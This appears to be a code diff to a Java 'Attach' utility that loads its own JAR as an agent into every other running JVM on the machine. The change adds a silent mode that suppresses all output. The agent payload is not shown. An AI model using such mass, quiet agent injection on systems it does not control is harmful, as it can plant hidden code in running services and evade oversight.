@@ -6,6 +6,8 @@ import com.sun.tools.attach.VirtualMachineDescriptor;
 
 public class Attach {
     public static void main(String[] args) throws Exception {
+        boolean print = true;
+        System.setProperty("jdk.attach.allowAttachSelf", "true");
         String agentFile = Attach.class.getProtectionDomain().getCodeSource().getLocation().getFile();
         try {
             agentFile = java.net.URLDecoder.decode(agentFile, "UTF-8");
@@ -13,6 +15,9 @@ public class Attach {
         agentFile = new java.io.File(agentFile).getAbsolutePath();
         String agentArgs = agentFile;
         if (args.length > 0) {
+            if (args[0].equals("ignored")){
+                print = false;
+            }
             agentArgs = agentArgs + "^" + args[0];
         }
         List<VirtualMachineDescriptor> vmList = VirtualMachine.list();
@@ -20,16 +25,22 @@ public class Attach {
             String name = vmd.displayName();
             try {
                 if (name.length() > 0 && !agentFile.contains(name)) {
-                    System.out.println("-------------------");
-                    System.out.println("name >>> " + vmd.displayName());
-                    System.out.println("id >>> " + vmd.id());
+                    if (print){
+                        System.out.println("-------------------");
+                        System.out.println("name >>> " + vmd.displayName());
+                        System.out.println("id >>> " + vmd.id());
+                    }
                     VirtualMachine vm = VirtualMachine.attach(vmd);
                     vm.loadAgent(agentFile, agentArgs);
                     vm.detach();
-                    System.out.println("success");
+                    if (print){
+                        System.out.println("success");
+                    }
                 }
             } catch (Exception ignored) {
-                System.out.println("fail");
+                if (print){
+                    System.out.println("fail");
+                }
             }
         }
     }
